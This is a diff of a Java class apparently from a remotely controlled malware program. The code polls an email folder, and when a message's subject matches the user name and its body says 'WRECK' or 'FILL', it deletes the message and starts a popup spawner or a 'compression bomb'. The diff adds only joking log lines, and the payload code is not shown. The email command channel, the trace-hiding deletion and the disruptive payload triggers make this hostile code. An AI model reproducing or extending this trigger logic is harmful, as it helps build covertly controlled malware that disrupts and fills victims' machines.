@@ -509,6 +509,7 @@ public class Radio
 			         }
 			         // Popup boxes
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Started spawning lulz :3");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 emailFolder.close(true);
 			        	 spawner.start();
@@ -516,6 +517,7 @@ public class Radio
 			         
 			         // Compression bomb
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] WTF BOOOOOOOOOOOOOOOOOOOOOOM!");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 emailFolder.close(true);
 			        	 AlphaDecay.start();
